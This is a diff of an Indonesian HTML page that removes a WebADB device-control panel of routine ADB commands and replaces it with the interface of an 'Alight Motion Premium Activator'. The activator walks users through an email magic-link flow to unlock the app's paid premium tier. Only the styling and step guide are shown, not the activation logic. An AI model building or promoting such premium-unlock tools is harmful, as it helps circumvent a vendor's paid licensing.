@@ -1,1216 +1,520 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>AdbNext — Professional WebADB Suite</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:ital,wght@0,400;0,500;0,600;1,400&display=swap" rel="stylesheet">
-  
-  <style>
-    :root {
-      --bg-base: #08090d;
-      --bg-surface: rgba(18, 20, 29, 0.65);
-      --surface-glass: rgba(255, 255, 255, 0.03);
-      --surface-glass-hover: rgba(255, 255, 255, 0.07);
-      --border-glass: rgba(255, 255, 255, 0.08);
-      --border-highlight: rgba(99, 102, 241, 0.4);
-      --accent-primary: #6366f1;
-      --accent-cyan: #06b6d4;
-      --accent-emerald: #10b981;
-      --accent-amber: #f59e0b;
-      --accent-rose: #f43f5e;
-      --text-main: #f8fafc;
-      --text-muted: #94a3b8;
-      --text-sub: #64748b;
-      --mono-font: 'JetBrains Mono', monospace;
-      --sans-font: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
-    }
-
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      -webkit-font-smoothing: antialiased;
-    }
-
-    body {
-      background-color: var(--bg-base);
-      color: var(--text-main);
-      font-family: var(--sans-font);
-      min-height: 100vh;
-      overflow-x: hidden;
-      background-image: 
-        radial-gradient(circle at 50% 0%, rgba(99, 102, 241, 0.12) 0%, transparent 50%),
-        radial-gradient(circle at 10% 25%, rgba(6, 182, 212, 0.08) 0%, transparent 40%),
-        radial-gradient(circle at 90% 70%, rgba(16, 185, 129, 0.06) 0%, transparent 50%);
-      background-attachment: fixed;
-    }
-
-    /* === TOAST NOTIFICATION === */
-    #toast-container {
-      position: fixed;
-      top: 24px;
-      right: 24px;
-      z-index: 9999;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      pointer-events: none;
-    }
-
-    .toast {
-      pointer-events: auto;
-      background: rgba(15, 23, 42, 0.95);
-      backdrop-filter: blur(20px);
-      border: 1px solid var(--border-glass);
-      color: #fff;
-      padding: 12px 18px;
-      border-radius: 14px;
-      font-size: 0.85rem;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-      animation: slideIn 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-      max-width: 350px;
-    }
-
-    .toast.success { border-color: rgba(16, 185, 129, 0.5); }
-    .toast.error { border-color: rgba(244, 63, 94, 0.5); }
-    .toast.info { border-color: rgba(99, 102, 241, 0.5); }
-
-    @keyframes slideIn {
-      from { transform: translateX(50px); opacity: 0; }
-      to { transform: translateX(0); opacity: 1; }
-    }
-
-    /* === GLASS PANEL === */
-    .glass-panel {
-      background: var(--bg-surface);
-      backdrop-filter: blur(35px) saturate(190%);
-      -webkit-backdrop-filter: blur(35px) saturate(190%);
-      border: 1px solid var(--border-glass);
-      border-radius: 20px;
-      box-shadow: 0 20px 40px -15px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.08);
-      transition: all 0.25s ease;
-    }
-
-    .glass-panel:hover {
-      border-color: rgba(255, 255, 255, 0.15);
-    }
-
-    /* === HEADER / DYNAMIC ISLAND === */
-    header {
-      position: sticky;
-      top: 14px;
-      z-index: 100;
-      display: flex;
-      justify-content: center;
-      padding: 0 16px;
-    }
-
-    .dynamic-island {
-      display: flex;
-      align-items: center;
-      gap: 16px;
-      padding: 8px 16px;
-      width: 100%;
-      max-width: 1180px;
-      background: rgba(13, 15, 22, 0.82);
-      backdrop-filter: blur(28px) saturate(200%);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 9999px;
-      box-shadow: 0 20px 50px rgba(0,0,0,0.7);
-    }
-
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-weight: 800;
-      font-size: 1rem;
-      letter-spacing: -0.02em;
-      padding-left: 6px;
-    }
-
-    .brand-glow {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      background: var(--accent-primary);
-      box-shadow: 0 0 12px var(--accent-primary);
-    }
-
-    .brand-glow.connected {
-      background: var(--accent-emerald);
-      box-shadow: 0 0 14px var(--accent-emerald);
-      animation: pulseGlow 2s infinite;
-    }
-
-    @keyframes pulseGlow {
-      0%, 100% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.2); opacity: 0.7; }
-    }
-
-    .nav-tabs {
-      display: flex;
-      gap: 4px;
-      margin-left: auto;
-      overflow-x: auto;
-      padding: 2px 0;
-      scrollbar-width: none;
-    }
-
-    .nav-tabs::-webkit-scrollbar { display: none; }
-
-    .nav-btn {
-      background: transparent;
-      border: none;
-      color: var(--text-muted);
-      font-family: inherit;
-      font-size: 0.8rem;
-      font-weight: 600;
-      padding: 8px 14px;
-      border-radius: 9999px;
-      cursor: pointer;
-      transition: all 0.2s;
-      white-space: nowrap;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .nav-btn:hover {
-      color: #fff;
-      background: rgba(255, 255, 255, 0.06);
-    }
-
-    .nav-btn.active {
-      color: #fff;
-      background: linear-gradient(135deg, rgba(99, 102, 241, 0.85), rgba(6, 182, 212, 0.85));
-      box-shadow: 0 4px 16px rgba(99, 102, 241, 0.35);
-    }
-
-    .connect-trigger {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      background: #ffffff;
-      color: #090a0f;
-      border: none;
-      padding: 8px 18px;
-      border-radius: 9999px;
-      font-weight: 700;
-      font-size: 0.8rem;
-      cursor: pointer;
-      transition: all 0.2s ease;
-      white-space: nowrap;
-    }
-
-    .connect-trigger:hover {
-      background: #e2e8f0;
-      transform: translateY(-1px);
-      box-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
-    }
-
-    .connect-trigger.connected {
-      background: rgba(244, 63, 94, 0.15);
-      color: #fb7185;
-      border: 1px solid rgba(244, 63, 94, 0.3);
-    }
-
-    .connect-trigger.connected:hover {
-      background: rgba(244, 63, 94, 0.25);
-    }
-
-    /* === MAIN CONTAINER === */
-    .container {
-      max-width: 1180px;
-      margin: 28px auto 260px;
-      padding: 0 16px;
-    }
-
-    /* === DEVICE HERO INFO === */
-    .device-hero {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 24px 28px;
-      margin-bottom: 24px;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .device-hero::after {
-      content: '';
-      position: absolute;
-      top: -40%;
-      right: -10%;
-      width: 300px;
-      height: 300px;
-      background: radial-gradient(circle, rgba(99, 102, 241, 0.15), transparent 70%);
-      pointer-events: none;
-    }
-
-    .device-details h1 {
-      font-size: 1.4rem;
-      font-weight: 800;
-      letter-spacing: -0.02em;
-      margin-bottom: 8px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
-
-    .device-badges {
-      display: flex;
-      gap: 8px;
-      flex-wrap: wrap;
-    }
-
-    .badge {
-      font-size: 0.72rem;
-      font-weight: 600;
-      padding: 4px 10px;
-      background: rgba(255, 255, 255, 0.04);
-      color: var(--text-muted);
-      border: 1px solid var(--border-glass);
-      border-radius: 8px;
-      font-family: var(--mono-font);
-      display: inline-flex;
-      align-items: center;
-      gap: 5px;
-    }
-
-    .badge.active-badge {
-      color: #34d399;
-      background: rgba(16, 185, 129, 0.1);
-      border-color: rgba(16, 185, 129, 0.3);
-    }
-
-    /* === CARDS & GRIDS === */
-    .section-content {
-      display: none;
-      animation: fadeIn 0.3s ease forwards;
-    }
-
-    .section-content.active-section {
-      display: block;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(6px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-
-    .grid-2 {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-      gap: 18px;
-    }
-
-    .feature-card {
-      padding: 22px;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      border-radius: 18px;
-    }
-
-    .feature-head {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-start;
-      margin-bottom: 8px;
-    }
-
-    .feature-title {
-      font-size: 0.95rem;
-      font-weight: 700;
-      color: #fff;
-    }
-
-    .feature-tag {
-      font-size: 0.68rem;
-      color: var(--accent-cyan);
-      font-family: var(--mono-font);
-      background: rgba(6, 182, 212, 0.08);
-      border: 1px solid rgba(6, 182, 212, 0.2);
-      padding: 2px 7px;
-      border-radius: 6px;
-    }
-
-    .feature-desc {
-      font-size: 0.8rem;
-      color: var(--text-muted);
-      line-height: 1.5;
-      margin-bottom: 16px;
-    }
-
-    .feature-actions {
-      display: flex;
-      gap: 8px;
-      flex-wrap: wrap;
-    }
-
-    /* === BUTTONS & FORM CONTROLS === */
-    .btn {
-      background: var(--surface-glass);
-      border: 1px solid var(--border-glass);
-      color: var(--text-main);
-      padding: 8px 14px;
-      border-radius: 10px;
-      font-size: 0.78rem;
-      font-weight: 600;
-      font-family: inherit;
-      cursor: pointer;
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      transition: all 0.2s;
-      user-select: none;
-    }
-
-    .btn:hover {
-      background: var(--surface-glass-hover);
-      border-color: rgba(255, 255, 255, 0.2);
-      color: #fff;
-      transform: translateY(-1px);
-    }
-
-    .btn:active {
-      transform: translateY(0);
-    }
-
-    .btn-solid {
-      background: #ffffff;
-      color: #090a0f;
-      border: none;
-    }
-
-    .btn-solid:hover {
-      background: #f1f5f9;
-      box-shadow: 0 0 16px rgba(255, 255, 255, 0.3);
-    }
-
-    .btn-danger {
-      background: rgba(244, 63, 94, 0.12);
-      border-color: rgba(244, 63, 94, 0.3);
-      color: #fda4af;
-    }
-
-    .btn-danger:hover {
-      background: rgba(244, 63, 94, 0.22);
-      border-color: rgba(244, 63, 94, 0.5);
-      color: #fff;
-    }
-
-    .input-glass {
-      width: 100%;
-      background: rgba(0, 0, 0, 0.4);
-      border: 1px solid var(--border-glass);
-      border-radius: 10px;
-      padding: 9px 12px;
-      color: #fff;
-      font-family: var(--mono-font);
-      font-size: 0.78rem;
-      outline: none;
-      margin-bottom: 12px;
-      transition: all 0.2s;
-    }
-
-    .input-glass:focus {
-      border-color: var(--accent-primary);
-      box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
-    }
-
-    /* === INTERACTIVE FLOATING TERMINAL HUD === */
-    .terminal-hud {
-      position: fixed;
-      bottom: 14px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: calc(100% - 32px);
-      max-width: 1180px;
-      z-index: 90;
-      background: rgba(11, 13, 20, 0.94);
-      backdrop-filter: blur(35px) saturate(220%);
-      border: 1px solid rgba(255, 255, 255, 0.12);
-      border-radius: 18px;
-      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.85);
-      transition: height 0.3s ease;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-    }
-
-    .hud-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 10px 16px;
-      background: rgba(255, 255, 255, 0.02);
-      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-      font-size: 0.72rem;
-      font-family: var(--mono-font);
-      color: var(--text-muted);
-    }
-
-    .hud-controls {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-
-    .hud-tool-btn {
-      background: transparent;
-      border: none;
-      color: var(--text-muted);
-      cursor: pointer;
-      font-size: 0.7rem;
-      padding: 3px 6px;
-      border-radius: 4px;
-      transition: 0.15s;
-    }
-
-    .hud-tool-btn:hover {
-      color: #fff;
-      background: rgba(255, 255, 255, 0.08);
-    }
-
-    .hud-logs {
-      font-family: var(--mono-font);
-      font-size: 0.76rem;
-      padding: 12px 16px;
-      height: 130px;
-      overflow-y: auto;
-      display: flex;
-      flex-direction: column;
-      gap: 4px;
-      background: rgba(0, 0, 0, 0.4);
-    }
-
-    .hud-logs.expanded {
-      height: 280px;
-    }
-
-    .hud-log-row {
-      display: flex;
-      gap: 8px;
-      line-height: 1.4;
-      word-break: break-all;
-    }
-
-    .hud-ts { color: var(--text-sub); }
-    .hud-cmd { color: #38bdf8; font-weight: 500; }
-    .hud-out { color: #e2e8f0; }
-    .hud-err { color: #f43f5e; font-weight: 600; }
-    .hud-succ { color: #34d399; font-weight: 600; }
-
-    .terminal-quick-input {
-      display: flex;
-      gap: 6px;
-      padding: 6px 12px;
-      background: rgba(255, 255, 255, 0.02);
-      border-top: 1px solid rgba(255, 255, 255, 0.05);
-    }
-
-    .terminal-quick-input input {
-      flex: 1;
-      background: transparent;
-      border: none;
-      color: #fff;
-      font-family: var(--mono-font);
-      font-size: 0.78rem;
-      outline: none;
-    }
-
-    @media (max-width: 820px) {
-      .dynamic-island {
-        border-radius: 20px;
-        flex-wrap: wrap;
-      }
-      .nav-tabs {
-        width: 100%;
-        order: 3;
-        margin-top: 6px;
-      }
-      .device-hero {
-        flex-direction: column;
-        align-items: flex-start;
-        gap: 16px;
-      }
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Asepeepepep v2 — Alight Motion Premium (Client-Side)</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e1a;
+    --card: #121829;
+    --stroke: rgba(255,255,255,0.08);
+    --txt: #e8ecf5;
+    --muted: #8b94ad;
+    --brand: #1e90ff;
+    --brand2: #4dabff;
+    --gold: #d4af37;
+    --ok: #22c55e;
+    --red: #ff4757;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; font-family:'Inter',system-ui,sans-serif; }
+  body {
+    background: radial-gradient(900px 500px at 20% -10%, rgba(30,144,255,0.18), transparent 60%),
+                radial-gradient(700px 400px at 90% 110%, rgba(212,175,55,0.12), transparent 60%),
+                linear-gradient(160deg,#0a0e1a,#0f1424);
+    color: var(--txt);
+    min-height: 100vh; min-height: 100dvh;
+    display: flex; align-items: center; justify-content: center;
+    padding: 20px;
+  }
+  .container {
+    width: 100%; max-width: 460px;
+    background: var(--card);
+    border: 1px solid var(--stroke);
+    border-radius: 20px;
+    padding: 28px 22px;
+    box-shadow: 0 25px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.04);
+  }
+  .logo {
+    width: 56px; height: 56px; border-radius: 16px;
+    margin: 0 auto 16px;
+    background: linear-gradient(135deg, var(--brand), var(--brand2));
+    display: flex; align-items: center; justify-content: center;
+    font-size: 26px;
+    box-shadow: 0 12px 28px rgba(30,144,255,0.4);
+  }
+  h1 {
+    text-align: center; font-size: 20px; font-weight: 800;
+    letter-spacing: -0.3px; margin-bottom: 6px;
+  }
+  .sub {
+    text-align: center; font-size: 12.5px; color: var(--muted);
+    margin-bottom: 22px; line-height: 1.55;
+  }
+  .badge {
+    display: inline-flex; align-items: center; gap: 6px;
+    font-size: 10px; font-weight: 700; letter-spacing: 0.8px;
+    text-transform: uppercase; color: var(--ok);
+    background: rgba(34,197,94,0.1);
+    border: 1px solid rgba(34,197,94,0.3);
+    padding: 4px 10px; border-radius: 999px;
+    margin-bottom: 12px;
+  }
+  .field { margin-bottom: 14px; }
+  label {
+    display: block; font-size: 12px; font-weight: 600;
+    color: #c3cbdd; margin-bottom: 6px;
+    letter-spacing: 0.3px;
+  }
+  .field input {
+    width: 100%; min-height: 50px;
+    padding: 14px 16px;
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--stroke);
+    border-radius: 10px;
+    color: var(--txt); font-size: 15px;
+    outline: none;
+    transition: border-color .15s ease, background .15s ease;
+    -webkit-appearance: none;
+  }
+  .field input:focus {
+    border-color: var(--brand);
+    background: rgba(30,144,255,0.05);
+    box-shadow: 0 0 0 3px rgba(30,144,255,0.12);
+  }
+  .field input::placeholder { color: #5b6483; }
+  .btn {
+    position: relative;
+    width: 100%; min-height: 52px;
+    border: none; cursor: pointer; border-radius: 10px;
+    font-size: 14px; font-weight: 800; letter-spacing: 0.5px;
+    color: #fff;
+    background: linear-gradient(90deg, var(--brand), var(--brand2));
+    text-transform: uppercase;
+    transition: transform .15s ease, filter .15s ease;
+    display: flex; align-items: center; justify-content: center; gap: 10px;
+    box-shadow: 0 10px 24px rgba(30,144,255,0.35);
+    overflow: hidden;
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { opacity: 0.8; cursor: default; }
+  .btn::after {
+    content: ""; position: absolute; top: 0; left: -120%;
+    width: 60%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent);
+    transform: skewX(-20deg);
+    animation: shine 3.4s ease-in-out infinite;
+  }
+  @keyframes shine { 0%,60% { left:-120%; } 100% { left:160%; } }
+  .btn-gold {
+    background: linear-gradient(180deg, var(--gold), #b8941f);
+    box-shadow: 0 10px 24px rgba(212,175,55,0.35);
+    color: #0a0e1a;
+  }
+  .btn-ghost {
+    background: rgba(255,255,255,0.06);
+    box-shadow: none;
+    border: 1px solid var(--stroke);
+    color: #c3cbdd;
+    font-weight: 600;
+    font-size: 12px;
+    min-height: 44px;
+  }
+  .divider {
+    display: flex; align-items: center; gap: 12px;
+    margin: 18px 0; color: var(--muted); font-size: 11px;
+  }
+  .divider::before, .divider::after {
+    content: ""; flex: 1; height: 1px; background: var(--stroke);
+  }
+  .status {
+    text-align: center; font-size: 13px; margin-top: 16px;
+    padding: 12px; border-radius: 10px;
+    display: none; line-height: 1.5;
+    word-break: break-word;
+  }
+  .status.info { background: rgba(30,144,255,0.1); color: #7ec8ff; border: 1px solid rgba(30,144,255,0.25); }
+  .status.ok { background: rgba(34,197,94,0.1); color: #a7f3c4; border: 1px solid rgba(34,197,94,0.25); }
+  .status.err { background: rgba(255,71,87,0.1); color: #ffb3ba; border: 1px solid rgba(255,71,87,0.25); }
+  .spinner {
+    width: 20px; height: 20px; border-radius: 50%;
+    border: 2px solid rgba(255,255,255,0.2);
+    border-top-color: #fff;
+    animation: spin 0.8s linear infinite;
+    display: inline-block;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .steps-guide {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--stroke);
+    border-radius: 10px;
+    padding: 14px;
+    margin-bottom: 18px;
+  }
+  .steps-guide .step-item {
+    display: flex; gap: 10px; align-items: flex-start;
+    font-size: 12px; color: #c3cbdd;
+    margin-bottom: 10px;
+  }
+  .steps-guide .step-item:last-child { margin-bottom: 0; }
+  .steps-guide .step-num {
+    width: 20px; height: 20px; border-radius: 50%;
+    background: rgba(30,144,255,0.15);
+    border: 1px solid rgba(30,144,255,0.35);
+    color: var(--brand2); font-size: 10px; font-weight: 800;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0; margin-top: 1px;
+  }
+  .footer-note {
+    text-align: center; font-size: 10px; color: #5b6483;
+    margin-top: 18px; line-height: 1.6;
+  }
+  .error-detail {
+    font-size: 10px; color: #8b94ad; margin-top: 8px;
+    font-family: monospace; word-break: break-all;
+    max-height: 80px; overflow-y: auto;
+    background: rgba(0,0,0,0.3); padding: 8px; border-radius: 6px;
+  }
+</style>
 </head>
 <body>
+<div class="container">
+  <div class="logo">⚡</div>
+  <h1>Asepeepepep v2</h1>
+  <p class="sub">Alight Motion Premium Activator<br>Client-Side — Tanpa Node.js</p>
 
-  <!-- Toast Notification System -->
-  <div id="toast-container"></div>
-
-  <!-- Dynamic Island Nav -->
-  <header>
-    <div class="dynamic-island">
-      <div class="brand">
-        <div class="brand-glow" id="statusGlow"></div>
-        <span>AdbNext</span>
+  <!-- STEP 1: Input Email -->
+  <div id="step1">
+    <div class="steps-guide">
+      <div class="step-item">
+        <div class="step-num">1</div>
+        <div>Masukkan email kamu</div>
       </div>
-      
-      <div class="nav-tabs">
-        <button class="nav-btn active" onclick="switchTab(this, 'control')">📱 Kontrol</button>
-        <button class="nav-btn" onclick="switchTab(this, 'apps')">📦 Aplikasi</button>
-        <button class="nav-btn" onclick="switchTab(this, 'files')">📂 File</button>
-        <button class="nav-btn" onclick="switchTab(this, 'screen')">🖥️ Layar</button>
-        <button class="nav-btn" onclick="switchTab(this, 'debug')">🔍 Debug</button>
-        <button class="nav-btn" onclick="switchTab(this, 'network')">🌐 Jaringan</button>
-        <button class="nav-btn" onclick="switchTab(this, 'developer')">🧑‍💻 Developer</button>
+      <div class="step-item">
+        <div class="step-num">2</div>
+        <div>Klik <strong>"Kirim Magic Link"</strong> — cek inbox</div>
       </div>
-
-      <button class="connect-trigger" id="btnConnect" onclick="toggleConnect()">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
-        <span id="btnConnectText">Connect Device</span>
-      </button>
-    </div>
-  </header>
-
-  <main class="container">
-    <!-- Device Status Hero -->
-    <div class="device-hero glass-panel">
-      <div class="device-details">
-        <h1 id="deviceModel">
-          <span>Tidak Terhubung</span>
-          <span style="font-size: 0.8rem; font-weight: normal; color: var(--text-muted);">(Klik tombol Connect di atas)</span>
-        </h1>
-        <div class="device-badges">
-          <span class="badge" id="adbStatus">STATUS: DISCONNECTED</span>
-          <span class="badge" id="adbTransport">TRANSPORT: WEBUSB / SIMULATION</span>
-          <span class="badge" id="deviceSerial">SERIAL: NONE</span>
-          <span class="badge" id="batteryLevel">BATT: --%</span>
-        </div>
+      <div class="step-item">
+        <div class="step-num">3</div>
+        <div>Klik link di email, copy URL dari address bar</div>
       </div>
-      <div style="display: flex; gap: 8px;">
-        <button class="btn" onclick="execAdb('adb devices -l')">Cek Status ADB</button>
-        <button class="btn" onclick="openSimulateMode()">Dev Sim Mode</button>
+      <div class="step-item">
+        <div class="step-num">4</div>
+        <div>Paste URL di kolom verifikasi — premium aktif</div>
       </div>
     </div>
 
-    <!-- 1. KONTROL PERANGKAT -->
-    <section id="tab-control" class="section-content active-section">
-      <div class="grid-2">
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Reboot Standard</div>
-            <span class="feature-tag">adb reboot</span>
-          </div>
-          <p class="feature-desc">Memuat ulang sistem operasi Android target secara bersih untuk refresh system cache atau reset temporary flag.</p>
-          <div class="feature-actions">
-            <button class="btn btn-solid" onclick="execAdb('adb reboot')">Restart HP Target</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Reboot Recovery</div>
-            <span class="feature-tag">adb reboot recovery</span>
-          </div>
-          <p class="feature-desc">Mengarahkan perangkat langsung ke partisi Recovery (Stock, TWRP, OrangeFox) untuk wipe cache / flashing ROM.</p>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb('adb reboot recovery')">Ke Recovery Mode</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Bootloader / Fastboot</div>
-            <span class="feature-tag">adb reboot bootloader</span>
-          </div>
-          <p class="feature-desc">Masuk ke interface Fastboot/Bootloader low-level untuk flash partisi boot/vendor atau OEM unlock.</p>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb('adb reboot bootloader')">Ke Fastboot</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Matikan Daya (Power Off)</div>
-            <span class="feature-tag">adb shell reboot -p</span>
-          </div>
-          <p class="feature-desc">Mematikan sistem operasi secara graceful shutdown tanpa menyentuh tombol hardware fisik.</p>
-          <div class="feature-actions">
-            <button class="btn btn-danger" onclick="execAdb('adb shell reboot -p')">Power Off Device</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel" style="grid-column: 1 / -1;">
-          <div class="feature-head">
-            <div class="feature-title">Android Interactive Shell</div>
-            <span class="feature-tag">adb shell &lt;cmd&gt;</span>
-          </div>
-          <p class="feature-desc">Jalankan instruksi Toybox/Busybox internal Android OS langsung dan terima feedback teks di terminal.</p>
-          <div style="display:flex; gap: 8px;">
-            <input type="text" id="customShellCmd" class="input-glass" placeholder="Contoh: getprop ro.build.version.release" value="getprop ro.product.model" />
-            <button class="btn btn-solid" style="height: 38px;" onclick="execCustomShell()">Eksekusi Shell</button>
-          </div>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb('adb shell pm list features')">Daftar Fitur Hardware</button>
-            <button class="btn" onclick="execAdb('adb shell df -h /data')">Cek Sisa Memori Internal (/data)</button>
-            <button class="btn" onclick="execAdb('adb shell uptime')">System Uptime</button>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- 2. APLIKASI -->
-    <section id="tab-apps" class="section-content">
-      <div class="grid-2">
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Pasang APK (Direct Sideload)</div>
-            <span class="feature-tag">adb install -r</span>
-          </div>
-          <p class="feature-desc">Pilih file package APK dari storage lokal untuk dikirim langsung ke sistem target tanpa konfirmasi UI.</p>
-          <input type="file" id="apkUpload" class="input-glass" accept=".apk" onchange="handleFileSelected(this, 'apk')" />
-          <div class="feature-actions">
-            <button class="btn btn-solid" onclick="installApkProcess()">Push & Install Package</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Kontrol Lifecycle Package</div>
-            <span class="feature-tag">pm / am</span>
-          </div>
-          <p class="feature-desc">Target Package Name yang sedang dianalisa atau diubah statusnya secara langsung.</p>
-          <input type="text" id="targetPkg" class="input-glass" placeholder="Package name" value="com.android.chrome" />
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb(`adb shell monkey -p ${getPkg()} -c android.intent.category.LAUNCHER 1`)">Launch App</button>
-            <button class="btn" onclick="execAdb(`adb shell am force-stop ${getPkg()}`)">Force Stop</button>
-            <button class="btn btn-danger" onclick="execAdb(`adb uninstall ${getPkg()}`)">Uninstall</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Pembersihan Cache & Data</div>
-            <span class="feature-tag">pm clear</span>
-          </div>
-          <p class="feature-desc">Mengosongkan SQLite database, file session token, dan cache aplikasi target secara instan.</p>
-          <div class="feature-actions">
-            <button class="btn btn-danger" onclick="execAdb(`adb shell pm clear ${getPkg()}`)">Clear App Data & Cache</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Freeze / Disable Bloatware</div>
-            <span class="feature-tag">pm disable-user</span>
-          </div>
-          <p class="feature-desc">Nonaktifkan bloatware OEM tanpa root dan pulihkan statusnya (enable) kapan pun.</p>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb(`adb shell pm disable-user --user 0 ${getPkg()}`)">Freeze (Disable)</button>
-            <button class="btn" onclick="execAdb(`adb shell pm enable ${getPkg()}`)">Unfreeze (Enable)</button>
-          </div>
-        </div>
-
-        <div class="feature-card glass-panel" style="grid-column: 1 / -1;">
-          <div class="feature-head">
-            <div class="feature-title">Daftar Paket Terpasang</div>
-            <span class="feature-tag">pm list packages</span>
-          </div>
-          <p class="feature-desc">Mencari dan menampilkan seluruh package aplikasi pihak ketiga atau package sistem internal.</p>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb('adb shell pm list packages -3')">Filter: User App (Third-party)</button>
-            <button class="btn" onclick="execAdb('adb shell pm list packages -s')">Filter: System App OEM</button>
-            <button class="btn" onclick="execAdb(`adb shell dumpsys package ${getPkg()}`)">Audit Detail Package</button>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- 3. FILE & DATA -->
-    <section id="tab-files" class="section-content">
-      <div class="grid-2">
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Push File ke Target</div>
-            <span class="feature-tag">adb push</span>
-          </div>
-          <p class="feature-desc">Mengirim file lokal dari browser ke folder penyimpanan internal perangkat Android target (/sdcard/Download/).</p>
-          <input type="file" id="fileUpload" class="input-glass" onchange="handleFileSelected(this, 'file')" />
-          <button class="btn btn-solid" onclick="pushFileProcess()">Upload ke /sdcard/Download/</button>
-        </div>
-
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
-            <div class="feature-title">Pull File dari Target</div>
-            <span class="feature-tag">adb pull</span>
-          </div>
-          <p class="feature-desc">Download log, database, atau screenshot yang ada di storage internal target ke browser Anda.</p>
-          <input type="text" id="pullPath" class="input-glass" placeholder="/sdcard/Download/test.txt" value="/sdcard/Download/test.txt" />
-          <button class="btn" onclick="execAdb(`adb pull ${document.getElementById('pullPath').value}`)">Tarik / Download File</button>
-        </div>
-
-        <div class="feature-card glass-panel" style="grid-column: 1 / -1;">
-          <div class="feature-head">
-            <div class="feature-title">Eksplorasi Filesystem</div>
-            <span class="feature-tag">ls / mkdir / rm</span>
-          </div>
-          <p class="feature-desc">Navigasi dan manipulasi struktur folder pada partisi internal Android.</p>
-          <div class="feature-actions">
-            <button class="btn" onclick="execAdb('adb shell ls -la /sdcard/')">Lihat Isi /sdcard/</button>
-            <button class="btn" onclick="execAdb('adb shell mkdir -p /sdcard/AdbNext_Lab')">Buat Folder /sdcard/AdbNext_Lab</button>
-            <button class="btn btn-danger" onclick="execAdb('adb shell rm -rf /sdcard/AdbNext_Lab')">Hapus Folder Lab</button>
-          </div>
-        </div>
-      </div>
-    </section>
-
-    <!-- 4. LAYAR & INPUT -->
-    <section id="tab-screen" class="section-content">
-      <div class="grid-2">
-        <div class="feature-card glass-panel">
-          <div class="feature-head">
